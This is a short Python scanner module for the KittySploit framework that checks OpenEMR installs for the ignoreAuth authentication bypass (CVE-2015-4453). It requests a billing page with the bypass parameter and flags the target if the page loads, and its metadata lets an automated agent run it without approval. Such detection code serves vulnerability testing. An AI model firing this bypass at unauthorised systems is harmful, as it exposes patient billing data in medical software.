#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""OpenEMR ignoreAuth authentication bypass (CVE-2015-4453)."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'OpenEMR - ignoreAuth Auth Bypass Detection (CVE-2015-4453)',
        'description': (
            'Detects CVE-2015-4453 by requesting '
            '/interface/billing/sl_eob_search.php?ignoreAuth=1.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2015', 'openemr', 'auth-bypass', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 3,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'admin_surface', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2015-4453',
        ],
        'cve': 'CVE-2015-4453',
    }

    def run(self):
        for base in ('', '/openemr', '/emr'):
            path = f'{base}/interface/billing/sl_eob_search.php?ignoreAuth=1'
            r = self.http_request(method='GET', path=path, allow_redirects=False)
            if r and '<title>EOB Posting - Search' in (r.text or ''):
                self.set_info(
                    severity='critical',
                    reason='OpenEMR ignoreAuth bypass (CVE-2015-4453)',
                    path=path.split('?')[0],
                )
                return True
        return False
